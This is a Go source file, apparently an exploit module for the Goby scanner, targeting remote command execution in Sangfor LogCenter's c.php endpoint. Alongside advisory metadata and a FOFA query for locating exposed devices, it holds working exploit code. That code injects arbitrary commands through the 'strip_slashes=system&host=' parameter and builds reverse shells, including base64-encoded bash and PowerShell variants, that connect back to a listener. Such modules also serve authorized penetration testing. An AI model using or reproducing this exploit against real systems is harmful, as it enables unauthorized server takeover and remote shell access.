package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Sangfor LogCenter c.php File Remote Command Execution Vulnerability",
    "Description": "<p>Sangfor LogCenter is a professional information security audit product launched by Shenfu Company. </p><p>There is a remote command execution vulnerability in the Sangfor LogCenter. By constructing an http request, the attacker can execute the code arbitrarily on the server side, write it, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Sangfor-LogCenter",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2021-06-15",
    "Author": "zhanfeiyang",
    "FofaQuery": "body=\"isHighPerformance : !!SFIsHighPerformance,\" && body!=\"BA\" && body!=\"内部威胁管理\"",
    "GobyQuery": "body=\"isHighPerformance : !!SFIsHighPerformance,\" && body!=\"BA\" && body!=\"内部威胁管理\"",
    "Level": "3",
    "Impact": "<p>There is a remote command execution vulnerability in the Sangfor LogCenter. By constructing an http request, the attacker can execute the code arbitrarily on the server side, write it, obtain server permissions, and then control the entire web server.</p>",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Is0day": false,
    "Recommendation": "<p>The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a> </p><p>1. If it is not necessary, the public network is prohibited from accessing the device.</p><p>2. Set access policies and whitelist access through firewalls and other security devices.</p>",
    "Translation": {
        "CN": {
            "Name": "深信服 日志中心 c.php 文件 远程命令执行漏洞",
            "Product": "深信服日志审计系统",
            "Description": "<p>深信服日志审计系统是深信服公司推出的专业信息安全审计产品。</p><p>日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br><br></p>",
            "Impact": "<p>深信服日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Sangfor LogCenter c.php File Remote Command Execution Vulnerability",
            "Product": "Sangfor-LogCenter",
            "Description": "<p>Sangfor LogCenter is a professional information security audit product launched by Shenfu Company.&nbsp;</p><p>There is a remote command execution vulnerability in the Sangfor LogCenter. By constructing an http request, the attacker can execute the code arbitrarily on the server side, write it, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a>&nbsp;</p><p>1. If it is not necessary, the public network is prohibited from accessing the device.</p><p>2. Set access policies and whitelist access through firewalls and other security devices.</p>",
            "Impact": "<p>There is a remote command execution vulnerability in the Sangfor LogCenter. By constructing an http request, the attacker can execute the code arbitrarily on the server side, write it, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=%E6%B7%B1%E4%BF%A1%E6%9C%8D"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/tool/log/c.php",
                "header": {}
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<b>Log Helper</b>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND"
    ],
    "AttackSurfaces": {
        "Application": [
            "Sangfor"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-07-05",
    "PocId": "10688"
}`
	/*
	  "ExpParams": [
	    {
	      "name": "attackType",
	      "type": "select",
	      "value": "cmd,reverse",
	      "show": ""
	    },
	    {
	      "name": "cmd",
	      "type": "input",
	      "value": "whoami",
	      "show": "attackType=cmd"
	    },
	    {
	      "name": "reverse",
	      "type": "select",
	      "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
	      "show": "attackType=reverse"
	    }
	  ],
	*/

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
			reRequestAAAA := regexp.MustCompile(RegularUrl)
			if !reRequestAAAA.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequestAAAA.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}
		command = url.QueryEscape(command)
		//command为原始命令，如果需编码，请自行编码后使用
		makeRequest := httpclient.NewGetRequestConfig("/tool/log/c.php?strip_slashes=system&host=" + command)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 5
		makeRequest.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil {
			return "", "", err
		}
		respResult, err := makeRegularAAAA(resp.Utf8Html, `(?s)</p>(.*?)<pre>`)
		if err != nil {
			return "", "", err
		}

		//漏洞url地址
		url := "/tool/log/c.php"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := respResult

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
